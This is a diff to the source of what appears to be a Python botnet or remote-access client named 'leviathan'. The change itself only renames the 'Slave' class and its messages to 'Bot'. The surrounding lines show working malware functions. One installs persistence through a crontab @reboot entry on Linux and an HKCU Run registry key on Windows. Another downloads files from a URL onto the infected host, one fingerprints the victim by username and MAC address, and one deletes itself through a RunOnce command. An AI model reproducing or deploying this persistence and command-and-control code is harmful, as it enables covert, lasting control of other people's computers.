@@ -28,7 +28,7 @@ def threaded(func):
     return wrapper
 
 
-class Slave(object):
+class Bot(object):
 
     def __init__(self):
         self.idle = False
@@ -76,11 +76,11 @@ class Slave(object):
             self.failed_connections = value
 
     def log(self, to_log):
-        """ Write data to slave log """
+        """ Write data to bot log """
         print(to_log)
 
     def get_UID(self):
-        """ Returns a unique ID for the slave """
+        """ Returns a unique ID for the bot """
         return getpass.getuser() + "_" + str(uuid.getnode())
 
     def server_connect(self):
@@ -143,7 +143,7 @@ class Slave(object):
 
     @threaded
     def download(self, file, destination=''):
-        """ Downloads a file the the slave host through HTTP(S) """
+        """ Downloads a file the the bot host through HTTP(S) """
         try:
             destination = self.expand_path(destination)
             if not destination:
@@ -159,36 +159,36 @@ class Slave(object):
             self.send_output(traceback.format_exc())
 
     def persist(self):
-        """ Installs the slave """
+        """ Installs the bot """
         if not getattr(sys, 'frozen', False):
-            self.send_output('[!] Persistence only supported on compiled slaves.')
+            self.send_output('[!] Persistence only supported on compiled bots.')
             return
         if self.is_installed():
-            self.send_output('[!] Slave seems to be already installed.')
+            self.send_output('[!] Bot seems to be already installed.')
             return
         if platform.system() == 'Linux':
             persist_dir = self.expand_path('~/.leviathan')
             if not os.path.exists(persist_dir):
                 os.makedirs(persist_dir)
-            slave_path = os.path.join(persist_dir, os.path.basename(sys.executable))
-            shutil.copyfile(sys.executable, slave_path)
-            os.system('chmod +x ' + slave_path)
-            os.system('(crontab -l;echo @reboot ' + slave_path + ')|crontab')
+            bot_path = os.path.join(persist_dir, os.path.basename(sys.executable))
+            shutil.copyfile(sys.executable, bot_path)
+            os.system('chmod +x ' + bot_path)
+            os.system('(crontab -l;echo @reboot ' + bot_path + ')|crontab')
         elif platform.system() == 'Windows':
             persist_dir = os.path.join(os.getenv('USERPROFILE'), 'leviathan')
             if not os.path.exists(persist_dir):
                 os.makedirs(persist_dir)
-            slave_path = os.path.join(persist_dir, os.path.basename(sys.executable))
-            shutil.copyfile(sys.executable, slave_path)
-            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v leviathan /t REG_SZ /d \"%s\"" % slave_path
+            bot_path = os.path.join(persist_dir, os.path.basename(sys.executable))
+            shutil.copyfile(sys.executable, bot_path)
+            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v leviathan /t REG_SZ /d \"%s\"" % bot_path
             subprocess.Popen(cmd, shell=True)
         else:
             self.send_output('[!] Not supported.')
             return
-        self.send_output('[+] Slave installed.')
+        self.send_output('[+] Bot installed.')
 
     def clean(self):
-        """ Uninstalls the slave """ 
+        """ Uninstalls the bot """ 
         if platform.system() == 'Linux':
             persist_dir = self.expand_path('~/.leviathan')
             if os.path.exists(persist_dir):
@@ -200,10 +200,10 @@ class Slave(object):
             subprocess.Popen(cmd, shell=True)
             cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v leviathan /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
             subprocess.Popen(cmd, shell=True)
-        self.send_output('[+] Slave removed successfully.')
+        self.send_output('[+] Bot removed successfully.')
 
     def exit(self):
-        """ Kills the slave """
+        """ Kills the bot """
         self.send_output('[+] Exiting... (bye!)')
         sys.exit(0)
 
@@ -360,8 +360,8 @@ class Slave(object):
 
 
 def main():
-    slave = Slave()
-    slave.run()
+    bot = Bot()
+    bot.run()
 
 
 if __name__ == "__main__":
